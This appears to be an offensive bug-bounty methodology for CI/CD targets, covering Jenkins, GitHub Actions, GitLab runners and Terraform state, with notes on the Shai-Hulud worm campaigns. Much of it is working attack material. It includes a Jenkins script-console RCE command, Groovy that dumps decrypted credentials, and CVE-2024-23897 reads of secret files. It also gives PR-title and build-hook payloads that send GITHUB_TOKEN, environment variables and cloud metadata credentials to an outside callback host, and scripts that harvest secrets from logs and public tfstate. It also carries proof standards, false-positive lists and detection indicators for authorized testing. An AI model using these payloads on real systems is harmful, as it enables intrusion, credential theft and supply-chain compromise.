# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs, misconfigs to look for

- **GitHub Actions cache poisoning is now a first-class attack class (2024-2026), not a curiosity.** Adnan Khan's original research, Cacheract PoC, CodeQL queries `actions/cache-poisoning/poisonable-step` and `actions/cache-poisoning/direct-cache` (severity 7.5), and CVE-2024-50338-adjacent toolkit issues. The structural fact: branches are the cache security boundary; a feature branch can read parent/default-branch caches; a low-trust trigger (`pull_request_target`, `issue_comment`, `workflow_run`) that can *write* the default-branch cache can detonate code in a later privileged/release job. GitHub hardened this in Nov 2024 by blocking cache writes after job conclusion — the current technique performs the whole poisoning **in-build**.
- **Fingerprint:** `grep -rn "actions/cache\|cache:" .github/workflows/`; compare cache keys used by PR jobs vs release/publish jobs; look for `setup-node with cache: npm` in a job that also checks out PR head; `--only-verified` secret scans.
- **Shai-Hulud worm family (2025-2026) — install-time execution and CI persistence:**
  - Sept 2025 original: npm preinstall/postinstall scripts, TruffleHog credential sweep, exfil to public GitHub repos named `Shai-Hulud`, new workflows exfiltrating repo secrets to `webhook.site`, private→public repo migration with `-migration` suffix, self-propagation on any found npm token. Assessed downstream of the s1ngularity/Nx compromise.
  - Nov 2025 **Shai-Hulud 2.0**: 796 packages / >20M weekly downloads; payload files `setup_bun.js` + 10MB obfuscated `bun_environment.js`; installs a **self-hosted GitHub runner** at `~/.dev-env` named `SHA1Hulud`, plus `discussion.yaml` workflow as C2 (open a Discussion → arbitrary commands); exfil repos described "Sha1-Hulud: The Second Coming"; destructive fallback wiping the home dir.
  - May 2026 **Mini Shai-Hulud**: first coordinated npm+PyPI wave (170+ npm, 2 PyPI, 404 malicious versions); entry via **TanStack PR workflow misconfiguration → CI cache poisoning → npm OIDC token exchange** (no stolen npm token needed; passed SLSA attestation validation). Kill-switch daemon wipes home dir if the token is revoked.
  - Aug 2026 **CHAINDROP/Mini Shai-Hulud variant**: 400+ packages including `keyv` (600M monthly downloads); `preinstall: node setup.mjs`, files `math_init.js`/`Math_Symbol.js`, commit-message bait `IfYouBlockThisAPIKeyItWillCrashTheLiveProductionServersOfAllThirdPartyClients`; injects `codeql_analysis.yml` branch/workflow to dump `${{ toJSON(secrets) }}` into a downloadable artifact.
- **Third-party action compromise:** `tj-actions/changed-files` **CVE-2025-30066** (Mar 14-15 2025) — malicious commit retroactively tagged across all versions, dumped runner-worker memory into public workflow logs (double-encoded base64), 23,000+ repos; initial access was a compromised `@tj-actions-bot` PAT, itself traced to a `pull_request_target` leak in `spotbugs/sonar-findbugs`.
- **2026 campaign patterns:** s1ngularity/Nx (pwn request), `hackerbot-claw` (AI-powered workflow untrusted-input RCE in >50% of targeted repos), `pull_request_nightmare` (Orca: misconfigured `pull_request_target` in Google/Microsoft/Fortune-500 repos), self-hosted runner backdoors (Sysdig). Tooling to triage statically: `zizmor` (audits include `cache-poisoning`, `known-vulnerable-actions`, `excessive-permissions`, `unpinned-tools`), `actionlint`, GitHub CodeQL `actions-security-extended.qls`, Gato-X / Depi for scaled recon.

## Signals and surfaces

### Crown Jewel Targets

Jenkins `/script` console reachable = immediate RCE. A GitHub Actions `pull_request_target` (or `workflow_run`) workflow that checks out the **PR head ref** and references untrusted `${{ github.event.* }}` in a shell `run:` = "Pwnrequest" → secret exfil from a fork PR with zero approval.

**Highest-value findings:**
- **Jenkins Script Console** — Groovy execution → full RCE → dump the credential store
- **Jenkins CLI file read (CVE-2024-23897)** — pre-auth `@/etc/passwd` arg expansion → read `secret.key`/`credentials.xml` → forge admin → RCE
- **GitHub Actions `pull_request_target` injection (Pwnrequest)** — fork PR controls `${{ }}` inside a privileged shell step → exfil `GITHUB_TOKEN` (often `contents:write`) and org secrets
- **Self-hosted runner poisoning** — non-ephemeral runner on a public repo executes a fork PR's build → attacker code runs on the runner host → persistence + secret theft
- **OIDC trust-policy abuse** — over-broad `sub` claim wildcard in an AWS IAM role trust policy → any workflow in the org assumes a privileged cloud role
- **Terraform state leakage** — `*.tfstate` in public S3/GCS/Blob → plaintext infra creds, DB passwords, private keys
- **Runner token / artifact / log leakage** — register attacker runner, or harvest secrets printed before `::add-mask::`

---

## Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

```bash
# Cache poisoning primitive (extend the existing Actions section)
# 1. In a low-trust job that can run PR code and write cache:
ACTIONS_CACHE_URL=...   # from job environment
ACTIONS_RUNTIME_TOKEN=...
# 2. Predict the key the privileged job restores:
#    node-modules-${{ hashFiles('package-lock.json') }}  — compute the hash yourself
# 3. Poisoned tarball contains extra files; tar extracts and overwrites by default:
#    node_modules/.bin/*, Makefile, package.json, _actions/.../index.js (post-step actions)
# 4. Later release job restores cache -> attacker files execute with registry publish rights.
# Cacheract automates steps 1-3 (entry replacement via actions:write, key prediction
#    for setup-node, inactive-cache static analysis of all workflows).

# Static triage before opening any PR
pip install zizmor && zizmor .github/workflows/
grep -rn "pull_request_target\|workflow_run\|issue_comment\|self-hosted" .github/workflows/
grep -rn "cache:" .github/workflows/                 # compare PR-job vs release-job keys
gh api "repos/ORG/REPO/actions/cache/caches" --jq '.caches[] | [.key,.scope] | @tsv'
# Self-hosted runner poisoning tell (Sysdig/Shai-Hulud):
#   runner process from ~/.dev-env, name SHA1HULUD, workflows with unsanitized ${{ }} in run:

# Worm IoCs to grep in installed deps / CI logs (Shai-Hulud family)
grep -rnE "setup_bun\.js|bun_environment\.js|math_init\.js|Math_Symbol\.js|setup\.mjs" node_modules/ .github/
grep -rn "bypass_2fa" ~/.npmrc .npmrc 2>/dev/null    # CHAINDROP propagation gate
```

Kill-chain shape to document: **PR checkout in privileged workflow → lifecycle-script execution (preinstall/postinstall) or `${{ }}` injection → steal cache URL/token and GITHUB_TOKEN → poison default-branch cache → privileged release job restores it → npm OIDC publish → self-propagating package updates**.

## Validation and proof

### Validation Discipline (per finding, before you report)

- **Jenkins console:** the `scriptText` POST returns your `id` output (`uid=…(jenkins)`). A returned login/SSO/Crowd page = **not** anon access. Screenshot the request+response.
- **CVE-2024-23897:** response contains real `/etc/passwd` content; confirm version is in range. Patched instances return an error with no leaked line.
- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. Token exfil via `printenv`/`/proc/self/environ` decoded at your endpoint — never `cat $GITHUB_TOKEN`.
- **OIDC abuse:** `aws sts get-caller-identity` from your controlled workflow returns the privileged role ARN — not just a permissive-looking trust policy.
- **Terraform state:** `jq` extraction yields ≥1 *live* secret, then a read-only auth proves it. ID/ARN-only state = no finding.
- **Runner token / image / logs:** demonstrate the secret authenticates (trufflehog `--only-verified`, or a real API call) — possession of a string is not impact.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Keep every existing gate in the "It-Didn't-Happen-Without-Proof" section** and add:
- **Cache poisoning:** a cache key collision is not a finding until you show (a) a low-trust trigger can *write* that key after GitHub's Nov-2024 timing change (in-build poisoning), and (b) a privileged job restores it and executes attacker-controlled content. OOB callback from the privileged job is mandatory; "the PR passed CI" proves nothing. CodeQL's high-precision queries encode the same rule — prefer them over eyeballing.
- **Compromised action (CVE-2025-30066 class):** check whether the repo pins actions to full commit SHAs vs mutable tags; pinning to SHA after the fact is the fix. A workflow merely *using* `tj-actions/changed-files` is not proof of exposure — check the run timeframe (Mar 14-15 2025) and whether logs/artifacts are public, then rotate.
- **Worm claims:** a malicious package name in a vulnerability feed is not proof of execution. Require `preinstall`/`postinstall` in `package.json`, payload file hashes, and a callback or filesystem artifact. Elastic/JFrog publish SHA-256s and EQL detections — reuse them. Presence of `bun` processing `Math_Symbol.js`/`math_init.js` is a high-fidelity endpoint signal.
- **Pwn request FP discipline:** `pull_request_target` without untrusted data reaching an execution sink remains non-exploitable (existing FP list). Confirm `actions/checkout` ref + a reachable sink first, then use `printenv`/`/proc/self/environ` + Collaborator — never `cat $GITHUB_TOKEN`.
- **OIDC abuse:** still require `aws sts get-caller-identity` (or equivalent cloud STS) from a workflow you control returning the privileged role ARN. A permissive-looking `sub` wildcard alone is not impact.
- **Severity:** cache poisoning → release/publish job, self-hosted runner takeover, OIDC role assumption, compromised publish action = Critical. Malicious package present but never executed in your environment = High at most; scope it to actual installs.

## Escalation and related chains

### Chain Table

| CI/CD finding | Chain to | Impact |
|---|---|---|
| Jenkins anon script console | Dump credential store → cloud/DB creds → lateral | Critical |
| Jenkins CLI file read (CVE-2024-23897) | Read `secret.key`+`credentials.xml` → forge admin → RCE | Critical |
| Actions `${{ }}` injection (Pwnrequest) | `printenv GITHUB_TOKEN`/secrets → push to protected branch | Critical |
| Self-hosted runner poisoning | Code-exec on runner host → IMDS creds → persistence | Critical |
| OIDC `sub` wildcard | `AssumeRole` privileged cloud role from any org workflow | Critical |
| Terraform state w/ live creds | Infra/DB/API credential use | Critical |
| GitLab runner registration | Register runner → capture pipeline secrets | High/Critical |
| Image/log/artifact secret | Direct credential use | High |

---

## Sources and related reading

### D. Sources — numbered list of URLs you actually fetched

1. https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/
2. https://www.bleepingcomputer.com/news/security/supply-chain-attack-on-popular-github-action-exposes-ci-cd-secrets/
3. https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/
4. https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache
5. https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-poisonable-step
6. https://codeql.github.com/codeql-query-help/actions/actions-cache-poisoning-direct-cache
7. https://www.landh.tech/blog/20251003-36m-installs
8. https://securitylabs.datadoghq.com/articles/case-for-github-actions-security
9. https://www.stepsecurity.io/blog/defend-your-github-actions-ci-cd-environment-in-public-repositories
10. https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors
11. https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce
12. https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
13. https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack
14. https://www.akamai.com/blog/security-research/mini-shai-hulud-worm-returns-goes-public
15. https://www.elastic.co/security-labs/shai-hulud-chaindrop-npm-supply-chain
16. https://research.jfrog.com/post/shai-hulud-is-back-august/
17. https://github.blog/security/supply-chain-security/strengthening-supply-chain-security-preparing-for-the-next-malware-campaign
18. https://www.jenkins.io/security/advisory/2024-01-24
19. https://nvd.nist.gov/vuln/detail/cve-2024-23897

## Additional notes

### "It-Didn't-Happen-Without-Proof" Gate (Read First)

CI/CD findings are over-reported because dashboards *look* exploitable. Before claiming anything:

1. **A login page is not an RCE.** A reachable `/script` URL that returns a Jenkins login or `403` is **not** an unauthenticated script console. Only an actual `scriptText` POST returning your command's output counts.
2. **A `pull_request_target` workflow is not automatically injectable.** It is only exploitable if untrusted data flows into an execution sink. Confirm the data flow (see FP section) before you ever open a PR.
3. **Blind injection requires OOB.** If the vulnerable step has no output you can read, you MUST confirm via Burp Collaborator / interactsh — a unique per-sink subdomain that the runner calls out to. A workflow that "ran green" is not proof your code executed.
4. **A `.tfstate` HTTP 200 is not cred exposure until you parse it.** Diff against a baseline (see FP section) — many `tfstate` files contain only resource IDs and outputs, no secrets.

---

### Phase 1 — Jenkins: Detection, Script Console, CVE-2024-23897

```bash
# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
curl -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
curl -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
done
```

**Unauthenticated script console → RCE (only if the POST returns output):**
```bash
# This must return uid=...(jenkins). If it returns the Jenkins login HTML or a
# Crowd/SSO error page, the console is NOT anon-accessible — do not report it.
curl -s -X POST "https://$TARGET/scriptText" \
  --data-urlencode 'script=println "id".execute().text'
```

**Dump the credential store** (Groovy decrypts secrets the UI masks):
```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import org.jenkinsci.plugins.plaincredentials.StringCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.username} :: ${it.password}"
}
CredentialsProvider.lookupCredentials(StringCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.secret}"
}
```

**CVE-2024-23897 — pre-auth arbitrary file read via Jenkins CLI** (args4j `@`-file expansion; affects ≤2.441 / LTS ≤2.426.2). With anonymous read, this escalates to RCE by reading `secret.key` + `master.key` to decrypt `credentials.xml`, or reading a user's `config.xml` API token:
```bash
# Download the matching jenkins-cli.jar from /jnlpJars/jenkins-cli.jar first.
java -jar jenkins-cli.jar -s "https://$TARGET/" -http connect-node "@/etc/passwd"
# The file content is echoed back in the error. Then target:
#   @/var/lib/jenkins/secret.key  @/var/lib/jenkins/secrets/master.key
#   @/var/lib/jenkins/credentials.xml
```
Validation: the response must contain real file content (root:x:0:0). A generic "no such agent" with no leaked line means the instance is patched or the path is wrong — not a finding.

---

### The core distinction (this is where 90% of false PoCs die)

There are **two** sink classes — they need different payloads:

- **`${{ }}` template expansion into a shell `run:`** — the expression is substituted into the script *before* the shell runs, so a newline/backtick/`$(...)` in the untrusted field becomes literal shell. This is the classic injection.
- **Environment variable read inside the shell** — `GITHUB_TOKEN`, `secrets.X`, and any `env:`-mapped value are **shell variables whose value IS the string**. To exfiltrate them you use `echo`/`printenv`, **never** `cat $VAR` (that tries to open a file *named* by the token and prints nothing).

```yaml
# VULNERABLE workflow (untrusted title flows into the script text):
on: pull_request_target            # runs with write token + secrets, on fork PRs
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # checks out ATTACKER code
      - run: echo "Building PR ${{ github.event.pull_request.title }}"   # ← ${{ }} INJECTION
```

**Attack via the `${{ }}` sink** — set the PR **title** (or branch name, body, label, commit message — all attacker-controlled) to break out of the echo and run your own commands. Exfiltrate the token with `printenv`, not `cat`:
```
PR title:  a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.<COLLAB>/?t=$T"; }; echo "
```
For a multi-line YAML `run:`, a newline injection is cleaner:
```
PR title:  foo\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)
```

**Attack via a poisoned checkout (no `${{ }}` needed)** — if `pull_request_target` checks out the PR head and then runs a build script / installs deps from the checked-out tree (`make`, `npm ci` with a malicious `preinstall`, a Makefile, a `.github/` action in the PR), the *runner executes attacker code directly*. Drop into any build hook:
```bash
# in attacker's PR, e.g. package.json preinstall or Makefile:
curl -s "https://x.<COLLAB>/?env=$(printenv | base64 -w0)"
cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected as env
```

**Self-hosted runner poisoning** — if `runs-on: self-hosted` (or a custom label) on a **public** repo with `pull_request`/`pull_request_target`, a fork PR's job runs on the org's own host. Non-ephemeral runners persist tools/creds between jobs. Confirm by reading the runner's identity and metadata from inside the job:
```bash
- run: |
    whoami; hostname; id
    curl -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
```

**OIDC trust-policy abuse** — workflows that `configure-aws-credentials` via OIDC assume an IAM role. A trust policy whose `token.actions.githubusercontent.com:sub` condition is missing or uses a loose wildcard (`repo:ORG/*:*`) lets **any** workflow in the org (including a malicious one you can merge, or a fork on a misconfigured trigger) assume that role. Inspect the role:
```bash
aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'
# Red flag: StringLike on sub with "repo:ORG/*" or no sub condition at all (only aud).
```
Then prove it: from a workflow you control in-org, assume the role and run `aws sts get-caller-identity` returning the privileged role ARN.

### Recon

```bash
# Enumerate org workflows that use the dangerous triggers
gh api graphql -f query='{organization(login:"ORG"){repositories(first:100){nodes{name}}}}' \
  | jq -r '.data.organization.repositories.nodes[].name' | while read r; do
  for wf in $(gh api "repos/ORG/$r/contents/.github/workflows" 2>/dev/null | jq -r '.[]?.name'); do
    body=$(gh api "repos/ORG/$r/contents/.github/workflows/$wf" 2>/dev/null | jq -r '.content' | base64 -d)
    echo "$body" | grep -Eq 'pull_request_target|workflow_run' && \
      echo "$body" | grep -Eq '\$\{\{ *github\.event|self-hosted|head\.ref|head\.sha' && \
      echo "CANDIDATE: ORG/$r/$wf"
  done
done
```
Triage candidates with the static analyzer before opening any PR: `gh extension install rhysd/actionlint` or run **zizmor** (`pip install zizmor; zizmor .github/workflows/`) which flags template-injection and dangerous-checkout patterns specifically.

---

### Actions cache poisoning

The GitHub Actions cache is not trust-isolated across branches by default: a workflow from an attacker branch/fork PR can write a cache entry (key or restore-key) that a later privileged workflow on the default branch restores, injecting attacker files (built binaries, deps, scripts) into a trusted build -> code execution in the privileged context. Check for cache actions keyed on attacker-influenced values, and whether privileged pipelines `restore-keys` a prefix an untrusted job can populate.

### Phase 3 — Secrets in Logs & Artifacts

```bash
# Public-repo run logs frequently contain secrets printed BEFORE ::add-mask:: took effect,
# or echoed via debug. The masker only hides exact known values — derived/base64 forms slip through.
gh api "repos/ORG/REPO/actions/runs" | jq -r '.workflow_runs[:20][].id' | while read id; do
  gh api "repos/ORG/REPO/actions/runs/$id/logs" > /tmp/r.zip 2>/dev/null && \
  unzip -o -q /tmp/r.zip -d /tmp/runlogs && \
  grep -rniE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN|eyJ[A-Za-z0-9_-]{10,}\.' /tmp/runlogs
done

# Artifacts — env dumps, .env, kubeconfig, built binaries with embedded secrets
gh api "repos/ORG/REPO/actions/artifacts" | jq -r '.artifacts[] | "\(.id) \(.name)"'
```
Note `actions/upload-artifact` does **not** redact secrets — an artifact named `env`/`debug` is a common direct leak.

---

### Phase 4 — GitLab CI

```bash
# Runner registration token → register an attacker runner that picks up jobs (and their secrets).
# Found in config.toml (via LFI/disclosure), screenshots, /admin/runners, or leaked CI logs.
curl -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"   # masked? protected?
curl -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"

# .gitlab-ci.yml review: unmasked variables, `CI_JOB_TOKEN` over-permission,
# `rules:` that run privileged jobs on MRs from forks (the GitLab analogue of pull_request_target).
curl -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
```
A registration token alone is **not** a finding unless the instance allows that token to register a runner that will execute a target project's pipeline. Demonstrate by registering an ephemeral runner you own and capturing a job's masked variables.

---

### Phase 5 — Terraform State Leakage

```bash
# Probe common public-bucket/path patterns (parameterize $T and $ORG)
for U in \
  "https://$ORG.s3.amazonaws.com/terraform.tfstate" \
  "https://s3.amazonaws.com/$ORG-tfstate/terraform.tfstate" \
  "https://$ORG-infra.s3.amazonaws.com/env/prod/terraform.tfstate" \
  "https://storage.googleapis.com/$ORG-tfstate/default.tfstate" \
  "https://$ORG.blob.core.windows.net/tfstate/terraform.tfstate" ; do
  code=$(curl -s -o /tmp/tf.json -w "%{http_code}" "$U")
  [ "$code" = "200" ] && echo "[+] 200 $U" && \
    jq -r '.resources[].instances[].attributes
           | to_entries[] | select(.key|test("password|secret|private_key|token|access_key";"i"))
           | "\(.key) = \(.value)"' /tmp/tf.json 2>/dev/null
done
# Also hunt state in repos / backend configs
gh search code --owner ORG "terraform.tfstate" --limit 10
gh search code --owner ORG 'backend "s3"' --limit 10
```
**False-positive filter:** a `tfstate` that lists only `id`, `arn`, `tags` is not a secret leak. Run the `jq` above and confirm at least one *live* credential (a real `password`, `private_key`, RDS master password, or non-rotated access key). Then prove impact by using that credential read-only (`aws sts get-caller-identity`, a DB connect that returns a banner) — do not just claim "creds in state."

---

### Phase 6 — Build Artifact / Image Analysis

```bash
docker pull ORG/IMAGE:latest
docker history --no-trunc ORG/IMAGE:latest | grep -iE 'ENV|ARG|secret|token|password|key'
# Layer-level scan catches secrets removed in a later layer but still present in history:
trufflehog docker --image ORG/IMAGE:latest --only-verified
```
`--only-verified` filters trufflehog to credentials it could actually authenticate — use it to drop the noise of expired/example keys before reporting.

---

### Grounded References (named cases / CVEs)

- **Pwnrequest / `pull_request_target` class** — GitHub Security Lab (Jaroslav Lobačevski), "Keeping your GitHub Actions and workflows secure: Untrusted input." The original write-up of fork-PR secret exfil and the dangerous-checkout pattern.
- **GitHub Actions workflow-command injection — CVE-2020-15228** — `set-env`/`add-path` workflow commands allowed env/PATH injection from logged output; this drove the deprecation of those commands and the move to `$GITHUB_ENV`.
- **Jenkins CLI arbitrary file read — CVE-2024-23897** — args4j `@`-prefixed file expansion (Jenkins ≤2.441 / LTS ≤2.426.2), read `secret.key`/`credentials.xml` → admin → RCE.
- **Jenkins Stapler RCE — CVE-2018-1000861** — dynamic routing reaches `groovy.lang.GroovyShell`; a staple of the unauth script-execution chain on older Jenkins.
- **PortSwigger / Liam Galvin & others** — research on GitHub Actions injection sinks (title/branch/body/label) and the `${{ }}`-into-`run` template-substitution vector; the basis of the actionlint/zizmor detection rules cited above.

(Only CVEs and cases I can attribute exactly are listed. Confirm the running version against the CVE's affected range before claiming it.)

---

### Common false positives to retract

- `/script` returning a login page (auth required) reported as "unauth RCE."
- `pull_request_target` present but untrusted input never reaches a sink (e.g., used only in `if:` on `github.actor`, or the workflow uses `pull_request` not `_target`).
- `${{ }}` reference that is already wrapped in an `env:` block and quoted in the shell (the recommended safe pattern) — not injectable.
- `.tfstate` 200 containing only resource metadata.
- A masked GitLab variable that is `protected` and only exposed to protected branches the attacker can't push to.
- Trufflehog "unverified" hits that are example/expired keys.

**Severity:** Jenkins console / CVE-2024-23897 / Actions secret exfil / runner poisoning / OIDC role assumption / Terraform live creds = **Critical**. Image/log/artifact secret = **High/Critical** by credential scope.

---

### Common false positives to retract

- `/script` returning a login page (auth required) reported as "unauth RCE."
- `pull_request_target` present but untrusted input never reaches a sink (e.g., used only in `if:` on `github.actor`, or the workflow uses `pull_request` not `_target`).
- `${{ }}` reference that is already wrapped in an `env:` block and quoted in the shell (the recommended safe pattern) — not injectable.
- `.tfstate` 200 containing only resource metadata.
- A masked GitLab variable that is `protected` and only exposed to protected branches the attacker can't push to.
- Trufflehog "unverified" hits that are example/expired keys.

**Severity:** Jenkins console / CVE-2024-23897 / Actions secret exfil / runner poisoning / OIDC role assumption / Terraform live creds = **Critical**. Image/log/artifact secret = **High/Critical** by credential scope.
